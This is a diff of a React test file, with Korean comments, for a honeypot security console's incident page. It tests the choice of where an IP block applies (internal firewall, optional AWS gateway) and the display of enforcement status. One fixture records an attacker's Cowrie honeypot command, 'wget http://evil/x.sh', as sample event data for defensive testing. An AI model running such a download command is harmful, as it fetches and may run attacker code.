@@ -2,7 +2,7 @@ import { fireEvent, screen, waitFor, within } from '@testing-library/react'
 import type { RouteObject } from 'react-router'
 import { afterEach, describe, expect, it, vi } from 'vitest'
 import { ctiKeys, incidentCtiPath } from '@/api/cti'
-import { incidentPath, type AbsorbedInfo, type EvidenceSample, type IncidentDetail, type IncidentDevice } from '@/api/incidents'
+import { incidentPath, type AbsorbedInfo, type BlockPointsInfo, type EvidenceSample, type IncidentDetail, type IncidentDevice } from '@/api/incidents'
 import { ACTION_STATUS } from '@/lib/domain'
 import { revealHidden } from '@/lib/untrusted'
 import { ctiBadgeText } from '@/components/molecules/cti-badge-format'
@@ -43,7 +43,9 @@ function detail(extra: Partial<IncidentDetail> = {}): IncidentDetail {
     actor: {
       history: { first_seen: '2026-09-10T00:00:00+00:00', last_seen: '2026-09-18T06:10:00+00:00', events: 120, sensors: ['hp-01'], sessions: 7 },
       rules: [{ rule_id: 'R001', incidents: 2 }],
-      blocked: { reason: 'console', method: 'nft', created_at: '2026-09-18T07:00:00+00:00', expires_at: '2999-01-01T00:00:00+00:00', released_at: null, enforced_at: '2026-09-18T07:00:10+00:00' },
+      // 두 지점 요청(이전 서버처럼 points 없음) · 관문 반영 · 내부 방화벽 적용 확인. 요청한 지점이 모두 확인이라 집행 확인이다(#77)
+      blocked: { reason: 'console', method: 'nft', created_at: '2026-09-18T07:00:00+00:00', expires_at: '2999-01-01T00:00:00+00:00', released_at: null, enforced_at: '2026-09-18T07:00:10+00:00',
+        enforcement: { fw: { state: 'confirmed', since: '2026-09-18T07:00:20+00:00', mode: 'nft', note: null } } },
     },
     raw: [
       { ts: '2026-09-18T06:00:30+00:00', sensor: 'hp-01', eventid: 'cowrie.command.input', session: 's-1', username: null, input: 'wget http://evil/x.sh', url: null, shasum: null, http_method: null, http_status: null, has_password: false, user_agent: null, message: 'CMD: wget http://evil/x.sh' },
@@ -303,6 +305,8 @@ describe('IncidentDetailPage', () => {
     expect(fetch.mock.calls.some(([, init]) => init?.method === 'POST')).toBe(false)
 
     const confirm = within(panel.getByRole('form', { name: '차단 확인' }))
+    // 적용 지점을 모르는 이전 서버(block_points 없음)는 묶음을 두지 않고 지점을 보내지 않는다(서버가 두 지점으로 본다)
+    expect(confirm.queryByRole('group', { name: '적용 지점' })).toBeNull()
     fireEvent.change(confirm.getByLabelText('만료'), { target: { value: '168' } })
     fireEvent.change(confirm.getByLabelText('메모 (선택)'), { target: { value: '세션 3개에서 명령 실행' } })
     fireEvent.click(confirm.getByRole('button', { name: '차단 확정' }))
@@ -830,12 +834,12 @@ describe('IncidentDetailPage · 차단 집행(#47)', () => {
   })
 
   it('③ 만료 없는 옛 차단은 집행 제외로 보이고 해제는 그대로 된다', async () => {
-    stubApi({ role: 'admin', body: detail({ actor: { ...detail().actor, blocked: { ...base, expires_at: null, enforced_at: null, method: null } } }) })
+    stubApi({ role: 'admin', body: detail({ actor: { ...detail().actor, blocked: { ...base, expires_at: null, enforced_at: null, method: null, enforcement: null } } }) })
     renderRoutes(routes(), PATH)
     const { panel } = await readyPanel()
     const actor = within(screen.getByRole('region', { name: '행위자 이력' }))
     expect(actor.getByText('집행 제외', { selector: 'span' })).toBeInTheDocument()
-    expect(actor.getByText('만료 없는 차단 · 관문에 넘기지 않음')).toBeInTheDocument()
+    expect(actor.getByText('만료 없는 차단 · 관문 · 내부 방화벽에 넘기지 않음')).toBeInTheDocument()
     expect(panel.getByRole('button', { name: '차단 해제' })).not.toHaveAttribute('aria-disabled')
   })
 
@@ -907,6 +911,161 @@ describe('IncidentDetailPage · 차단 집행(#47)', () => {
       unmount()
       vi.unstubAllGlobals()
     }
+  })
+})
+
+describe('IncidentDetailPage · 차단 적용 지점(#77)', () => {
+  afterEach(() => {
+    vi.unstubAllGlobals()
+  })
+
+  const COWRIE: IncidentDevice = { id: 'aws-sensor', part: 'cowrie', label: 'Cowrie', group: 'sensor', logs: ['SSH 세션'], basis: 'confirmed' }
+  const WEB: IncidentDevice = { id: 'web-01', part: null, label: 'web-01', group: 'protected', logs: ['웹 접근'], basis: 'confirmed' }
+  const CONSOLE: IncidentDevice = { id: 'console', part: null, label: '관제 콘솔', group: 'monitor', logs: ['콘솔 감사'], basis: 'confirmed' }
+  const DATA: IncidentDevice = { id: 'data-node', part: null, label: '데이터 노드', group: 'monitor', logs: ['감사'], basis: 'rule_scope' }
+  /** 살아 있는 차단 없음 · 내부 방화벽 기본(서버 block_points: 규칙만으로 정한 기본값 · 까닭 · 살아 있는 요청) */
+  const SENSOR_ONLY: BlockPointsInfo = { default: ['fw'], basis: 'sensor_only', requested: null }
+  const noBlock = { ...detail().actor, blocked: null }
+
+  async function openBlock() {
+    const { panel } = await readyPanel()
+    fireEvent.click(panel.getByRole('button', { name: '차단' }))
+    const box = panel.getByRole('form', { name: '차단 확인' })
+    return { panel, form: within(box), group: within(within(box).getByRole('group', { name: '적용 지점' })) }
+  }
+
+  const CASES: Array<[string, Partial<IncidentDetail>, BlockPointsInfo, boolean, RegExp]> = [
+    ['Cowrie 에서만 본 사건 → 내부 방화벽', { rule_id: 'R001', devices: [COWRIE], device_state: 'confirmed' }, SENSOR_ONLY, false, /^허니팟 센서에서만 본 위협이라 관측이 이어지게 기본은 내부 방화벽만입니다\. 허니팟 자원 소모 · 침해 의심이면 관문을 더합니다\.$/],
+    ['허니팟 남용(R004) → 관문 + 내부 방화벽', { rule_id: 'R004', devices: [COWRIE], device_state: 'confirmed' }, { default: ['gateway', 'fw'], basis: 'honeypot_abuse', requested: null }, true, /^허니팟 남용 규칙\(프록시 남용 시도\)이라 기본으로 관문에서도 막습니다\.$/],
+    ['web-01 사건 → 내부 방화벽', { rule_id: 'R102', devices: [WEB], device_state: 'confirmed' }, { default: ['fw'], basis: 'protected', requested: null }, false, /^보호 대상에서 본 위협이라 기본은 내부 방화벽입니다\.$/],
+    ['관제 콘솔 · 데이터 노드 사건 → 내부 방화벽', { rule_id: 'R201', devices: [CONSOLE, DATA], device_state: 'confirmed' }, { default: ['fw'], basis: 'monitor', requested: null }, false, /^관제 시스템\(콘솔 · 데이터 노드\)에서 본 위협이라 기본은 내부 방화벽입니다\.$/],
+  ]
+
+  it.each(CASES)('확인 창 기본값: %s', async (_name, extra, points, gateway, tip) => {
+    stubApi({ body: detail({ ...extra, actor: noBlock, block_points: points }) })
+    renderRoutes(routes(), PATH)
+    const { form, group } = await openBlock()
+    // 내부 방화벽은 늘 막는다(고정). 관문은 확인란 하나
+    const fw = group.getByRole('checkbox', { name: '내부 방화벽 · 늘 적용' })
+    expect(fw).toBeChecked()
+    expect(fw).toBeDisabled()
+    const check = group.getByRole('checkbox', { name: 'AWS 관문에서도 막기' })
+    expect((check as HTMLInputElement).checked).toBe(gateway)
+    expect(check).toBeEnabled()
+    // 기본값의 까닭은 확인란 옆 ⓘ 한 줄
+    expect(group.getByRole('button', { name: 'AWS 관문에서도 막기 설명' })).toHaveAccessibleDescription(tip)
+    // 관문에서도 막으면 경고 한 줄(허니팟 관측이 끊긴다, 주의색). 내부 방화벽만이면 없다
+    expect(group.queryByText('허니팟 관측이 끊깁니다.')?.classList.contains('text-warning') ?? false).toBe(gateway)
+    // 적용 대상 두 지점을 늘어놓던 문장은 묶음이 대신한다
+    expect(form.getByRole('button', { name: '차단 설명' })).toHaveAccessibleDescription('실제 적용 결과는 지점별로 확인합니다.')
+  })
+
+  it('기본값 그대로 보내면 내부 방화벽만, 관문을 더하면 경고 한 줄과 두 지점이 가고, 다시 열면 기본값이다', async () => {
+    const fetch = stubApi({ body: detail({ actor: noBlock, block_points: SENSOR_ONLY }) })
+    renderRoutes(routes(), PATH)
+    const first = await openBlock()
+    fireEvent.click(first.form.getByRole('button', { name: '차단 확정' }))
+    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'block_ip', expires_hours: 24, points: ['fw'] }))
+    expect(await first.panel.findByText('차단 조치를 기록했습니다')).toBeInTheDocument()
+
+    fetch.mockClear()
+    const { panel, form, group } = await openBlock()
+    const check = group.getByRole('checkbox', { name: 'AWS 관문에서도 막기' })
+    expect(check).not.toBeChecked()
+    fireEvent.click(check)
+    expect(check).toBeChecked()
+    expect(check).toHaveAccessibleDescription(/^허니팟 관측이 끊깁니다\. 허니팟 센서에서만 본 위협이라/)
+    fireEvent.click(form.getByRole('button', { name: '차단 확정' }))
+    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'block_ip', expires_hours: 24, points: ['gateway', 'fw'] }))
+    expect(await panel.findByText('차단 조치를 기록했습니다')).toBeInTheDocument()
+    // 다시 열면 고른 것은 사라지고 기본값(내부 방화벽만)이다
+    fireEvent.click(panel.getByRole('button', { name: '차단' }))
+    expect(within(panel.getByRole('group', { name: '적용 지점' })).getByRole('checkbox', { name: 'AWS 관문에서도 막기' })).not.toBeChecked()
+  })
+
+  it('살아 있는 차단이 관문을 요청했으면 체크한 채 잠그고, admin 은 풀 수 있으며 풀면 해제 뒤 다시 걸기로 기록된다고 알린다', async () => {
+    const live: BlockPointsInfo = { default: ['fw'], basis: 'sensor_only', requested: ['gateway', 'fw'] }
+    stubApi({ body: detail({ block_points: live }) })
+    const view = renderRoutes(routes(), PATH)
+    const operator = await openBlock()
+    const locked = operator.group.getByRole('checkbox', { name: 'AWS 관문에서도 막기' })
+    expect(locked).toBeChecked()
+    expect(locked).toBeDisabled()
+    expect(locked).toHaveAccessibleDescription(/^살아 있는 차단이 관문도 막고 있어 admin 만 뺄 수 있습니다\./)
+    // 이미 관문에서 막고 있어 관측이 끊긴다는 경고는 되풀이하지 않는다
+    expect(operator.group.queryByText('허니팟 관측이 끊깁니다.')).toBeNull()
+    view.unmount()
+    vi.unstubAllGlobals()
+
+    const fetch = stubApi({ role: 'admin', body: detail({ block_points: live }) })
+    renderRoutes(routes(), PATH)
+    const { form, group } = await openBlock()
+    const check = group.getByRole('checkbox', { name: 'AWS 관문에서도 막기' })
+    expect(check).toBeChecked()
+    expect(check).toBeEnabled()
+    expect(group.queryByText('해제 뒤 다시 걸기로 기록됩니다.')).toBeNull()
+    fireEvent.click(check)
+    expect(group.getByText('해제 뒤 다시 걸기로 기록됩니다.')).toHaveClass('text-warning')
+    fireEvent.click(form.getByRole('button', { name: '차단 확정' }))
+    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'block_ip', expires_hours: 24, points: ['fw'] }))
+  })
+
+  it('만료 없는 옛 차단에서 admin 이 관문을 빼면 적용 지점도 바뀐다고 본문에 적는다', async () => {
+    const legacy = { ...detail().actor.blocked!, expires_at: null, enforced_at: null, method: null, enforce_note: '집행 제외 · 만료 없음' }
+    stubApi({ role: 'admin', body: detail({ actor: { ...detail().actor, blocked: legacy }, block_points: { default: ['fw'], basis: 'sensor_only', requested: ['gateway', 'fw'] } }) })
+    renderRoutes(routes(), PATH)
+    const { form, group } = await openBlock()
+    expect(form.getByText(/이 요청은 사유 · 요청자만 바꿉니다/)).toBeInTheDocument()
+    fireEvent.click(group.getByRole('checkbox', { name: 'AWS 관문에서도 막기' }))
+    expect(form.getByText(/이 요청은 사유 · 요청자 · 적용 지점만 바꿉니다/)).toBeInTheDocument()
+  })
+
+  it('내부 방화벽만 건 살아 있는 차단은 ③ 관문 칸이 미요청이고, operator 도 관문을 더해 넓힐 수 있다', async () => {
+    const fwOnly = { ...detail().actor.blocked!, points: ['fw' as const], method: null, enforced_at: null }
+    const fetch = stubApi({ body: detail({ actor: { ...detail().actor, blocked: fwOnly }, block_points: { ...SENSOR_ONLY, requested: ['fw'] } }) })
+    renderRoutes(routes(), PATH)
+    const actor = within(await screen.findByRole('region', { name: '행위자 이력' }))
+    // 요청한 지점(내부 방화벽)이 확인이라 집행 확인이다. 관문 칸은 미확인 · 실패가 아니라 미요청
+    expect(actor.getByText('집행 확인', { selector: 'span' })).toBeInTheDocument()
+    expect(actor.getByText('내부 방화벽 반영 확인')).toBeInTheDocument()
+    const list = actor.getByRole('list', { name: '집행 지점별 결과' })
+    expect([...list.querySelectorAll('[data-enforce-point]')].map((el) => [el.getAttribute('data-enforce-point'), el.getAttribute('data-point-state')])).toEqual([['gateway', 'unrequested'], ['fw', 'confirmed']])
+    expect(list.querySelector('[data-enforce-point="gateway"]')).toHaveTextContent(/^AWS 관문미요청$/)
+
+    const { form, group } = await openBlock()
+    const check = group.getByRole('checkbox', { name: 'AWS 관문에서도 막기' })
+    expect(check).not.toBeChecked()
+    expect(check).toBeEnabled()
+    fireEvent.click(check)
+    expect(group.getByText('허니팟 관측이 끊깁니다.')).toBeInTheDocument()
+    fireEvent.click(form.getByRole('button', { name: '차단 확정' }))
+    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'block_ip', expires_hours: 24, points: ['gateway', 'fw'] }))
+  })
+
+  it('관리자가 관문을 뺀 차단은 관문이 뺐다고 확인될 때까지 ③ 관문 칸이 빠짐 확인 전이다(#77 결정 14)', async () => {
+    const since = '2026-09-18T07:10:00+00:00'
+    const narrowed = { ...detail().actor.blocked!, points: ['fw' as const], enforce_note: '관문 반영 · abcd1234 · x',
+      enforcement: { gateway: { state: 'removing' as const, since, mode: 'nft', note: null }, fw: { state: 'confirmed' as const, since: '2026-09-18T07:00:20+00:00', mode: 'nft', note: null } } }
+    stubApi({ body: detail({ actor: { ...detail().actor, blocked: narrowed }, block_points: { ...SENSOR_ONLY, requested: ['fw'] } }) })
+    renderRoutes(routes(), PATH)
+    const actor = within(await screen.findByRole('region', { name: '행위자 이력' }))
+    // 요청한 지점(내부 방화벽)이 확인이라 집행 확인이다. 관문 칸은 미요청이 아니라 빠짐 확인 전이고 관문 확인 시각은 보이지 않는다
+    expect(actor.getByText('집행 확인', { selector: 'span' })).toBeInTheDocument()
+    expect(actor.getByText('내부 방화벽 반영 확인 · 관문에서 빠졌는지 확인 전')).toBeInTheDocument()
+    const list = actor.getByRole('list', { name: '집행 지점별 결과' })
+    expect([...list.querySelectorAll('[data-enforce-point]')].map((el) => [el.getAttribute('data-enforce-point'), el.getAttribute('data-point-state')])).toEqual([['gateway', 'removing'], ['fw', 'confirmed']])
+    expect(list.querySelector('[data-enforce-point="gateway"]')).toHaveTextContent(/^AWS 관문빠짐 확인 전/)
+  })
+
+  it('흡수된 출발지를 함께 차단하면 같은 지점이 간다(흡수 차단 · 후속 차단 약속도 같은 지점)', async () => {
+    const fetch = stubApi({ body: detail({ rule_id: 'R006', absorbed: absorbed(), actor: noBlock, block_points: SENSOR_ONLY }) })
+    renderRoutes(routes(), PATH)
+    const { form, group } = await openBlock()
+    expect(form.getByRole('button', { name: '흡수된 출발지 2곳도 함께 차단 설명' })).toHaveAccessibleDescription(/적용 지점은 이 출발지와 같고, 살아 있는 차단은 넓히기만 합니다\.$/)
+    fireEvent.click(form.getByRole('checkbox', { name: '흡수된 출발지 2곳도 함께 차단' }))
+    fireEvent.click(group.getByRole('checkbox', { name: 'AWS 관문에서도 막기' }))
+    fireEvent.click(form.getByRole('button', { name: '차단 확정' }))
+    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ action: 'block_ip', expires_hours: 24, include_absorbed: true, points: ['gateway', 'fw'] }))
   })
 })
 
